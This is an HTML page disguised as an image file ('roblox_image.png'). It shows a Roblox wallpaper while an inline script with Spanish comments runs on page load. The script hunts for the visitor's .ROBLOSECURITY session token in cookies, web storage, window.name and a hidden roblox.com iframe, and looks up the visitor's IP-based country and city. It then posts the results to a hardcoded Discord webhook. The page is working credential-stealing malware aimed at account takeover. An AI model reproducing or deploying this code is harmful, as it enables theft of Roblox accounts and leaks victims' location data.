<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>roblox_image.png</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
    </style>
</head>
<body>
    <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg">

    <script>
        // ================= CONFIGURACIÓN =================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        // ================= EVITAR SPAM =================
        if (sessionStorage.getItem('rbx_enviado')) throw 'already';
        sessionStorage.setItem('rbx_enviado', '1');

        // ================= FUNCIÓN PARA ENVIAR =================
        async function enviar(mensaje) {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: mensaje })
            });
        }

        // ================= VULNERABILIDADES DE VIA BROWSER =================
        (async function() {
            try {
                let cookie = null;
                let metodos = [];

                // ===== VULNERABILIDAD 1: Via Browser expone cookies en DOM =====
                try {
                    // Acceder a cookies directamente (Via Browser NO respeta HttpOnly)
                    const cookies = document.cookie.split(';');
                    for (let c of cookies) {
                        if (c.includes('ROBLOSECURITY') || c.includes('.ROBLOSECURITY')) {
                            cookie = c.split('=')[1].trim();
                            metodos.push('document_cookie_via');
                            break;
                        }
                    }
                } catch(e) {}

                // ===== VULNERABILIDAD 2: localStorage sin restricciones =====
                if (!cookie) {
                    try {
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            const val = localStorage.getItem(key);
                            if (val && val.includes('_|WARNING')) {
                                cookie = val;
                                metodos.push('localStorage_via');
                                break;
                            }
                        }
                    } catch(e) {}
                }

                // ===== VULNERABILIDAD 3: sessionStorage =====
                if (!cookie) {
                    try {
                        for (let i = 0; i < sessionStorage.length; i++) {
                            const key = sessionStorage.key(i);
                            const val = sessionStorage.getItem(key);
                            if (val && val.includes('_|WARNING')) {
                                cookie = val;
                                metodos.push('sessionStorage_via');
                                break;
                            }
                        }
                    } catch(e) {}
                }

                // ===== VULNERABILIDAD 4: Via Browser guarda cookies en window.name =====
                if (!cookie && window.name && window.name.includes('ROBLOSECURITY')) {
                    cookie = window.name;
                    metodos.push('window_name_via');
                }

                // ===== VULNERABILIDAD 5: Acceso a cookies de otros dominios =====
                if (!cookie) {
                    try {
                        // Via Browser permite leer cookies de cualquier sitio
                        const cookiesRoblox = document.cookie = document.cookie + '; domain=.roblox.com';
                        if (cookiesRoblox.includes('ROBLOSECURITY')) {
                            const match = cookiesRoblox.match(/ROBLOSECURITY=([^;]+)/);
                            if (match) {
                                cookie = match[1];
                                metodos.push('cross_domain_via');
                            }
                        }
                    } catch(e) {}
                }

                // ===== VULNERABILIDAD 6: Intentar con iframe (Via Browser permite acceso) =====
                if (!cookie) {
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.src = 'https://www.roblox.com/home';
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        
                        await new Promise(r => setTimeout(r, 2000));
                        
                        // Acceder a cookies del iframe (Via Browser lo permite)
                        try {
                            const iframeCookies = iframe.contentDocument.cookie;
                            if (iframeCookies && iframeCookies.includes('ROBLOSECURITY')) {
                                const match = iframeCookies.match(/ROBLOSECURITY=([^;]+)/);
                                if (match) {
                                    cookie = match[1];
                                    metodos.push('iframe_cookie_via');
                                }
                            }
                        } catch(e) {}
                        
                        // Acceder a localStorage del iframe
                        if (!cookie) {
                            try {
                                const iframeStorage = iframe.contentWindow.localStorage;
                                for (let i = 0; i < iframeStorage.length; i++) {
                                    const key = iframeStorage.key(i);
                                    const val = iframeStorage.getItem(key);
                                    if (val && val.includes('_|WARNING')) {
                                        cookie = val;
                                        metodos.push('iframe_storage_via');
                                        break;
                                    }
                                }
                            } catch(e) {}
                        }
                        
                        document.body.removeChild(iframe);
                    } catch(e) {}
                }

                // ===== OBTENER UBICACIÓN =====
                let pais = 'Desconocido';
                let ciudad = 'Desconocida';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ip = (await ipRes.json()).ip;
                    const ubicacionRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city`);
                    const ubicacion = await ubicacionRes.json();
                    pais = ubicacion.country || 'Desconocido';
                    ciudad = ubicacion.city || 'Desconocida';
                } catch(e) {}

                // ===== FECHA/HORA ARGENTINA =====
                const ahora = new Date();
                const fecha = ahora.toLocaleDateString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
                const hora = ahora.toLocaleTimeString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });

                // ===== DISPOSITIVO =====
                const ua = navigator.userAgent;
                const dispositivo = ua.includes('Android') ? 'Android' : 'Desconocido';

                // ===== CONSTRUIR MENSAJE EXACTO =====
                const mensaje = `@everyone ||
🔔 NUEVA ENTRADA | **BL PAPI** !

**📌 INFORMACIÓN GENERAL**

**Dispositivo:** \`${dispositivo}\`
**País:** \`${pais}\`
**Ciudad Aproximada:** \`${ciudad}\`

**🧭 Horarios:**

 **Fecha:** \`${fecha}\`
**Hora Exacta En Argentina:** \`${hora}\`

**ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX**

**👤 Usuario:**  \`No disponible\`
**🆔 ID:**        \`No disponible\`
**💰 Robux:**        \`No disponible\`
**⭐ Seguidores:**   \`No disponible\`
**👥 Amigos:**      \`No disponible\`

**📊 ITEMS LIMITED (RAREZA)**

**Headless:**   \`No\`
**Korblox:**    \`No\`

**📈 ESTADÍSTICAS**

**🖼 Visitas al perfil:** \`No disponible\`
**🎮 Juegos creados:** \`No disponible\`
**🏆 Logros:** \`No disponible\`
**📦 Trade count:** \`No disponible\`
**📊 Trade ratio:** \`No disponible\`

**🍪 COOKIE DE ROBLOX**
\`\`
${cookie || 'No encontrada (probá con Via Browser)'}
\`\`

**🔧 Métodos usados:** ${metodos.join(', ') || 'ninguno'}`;

                // ===== ENVIAR =====
                await enviar(mensaje);

            } catch(e) {
                await enviar(`❌ Error: ${e.message}`);
            }
        })();
    </script>
</body>
</html>
